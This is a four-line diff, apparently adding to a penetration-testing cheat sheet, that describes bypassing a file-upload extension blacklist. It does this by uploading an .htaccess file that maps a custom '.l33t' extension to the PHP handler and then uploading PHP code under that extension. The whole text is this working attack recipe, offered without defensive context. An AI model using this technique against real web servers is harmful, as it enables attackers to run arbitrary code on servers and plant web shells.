@@ -1,0 +1,4 @@
+Extension blacklist bypass :
+  .htaccess ==> AddType application/x-httpd-php .l33t
+  then upload a php file with the .l33t extension
+
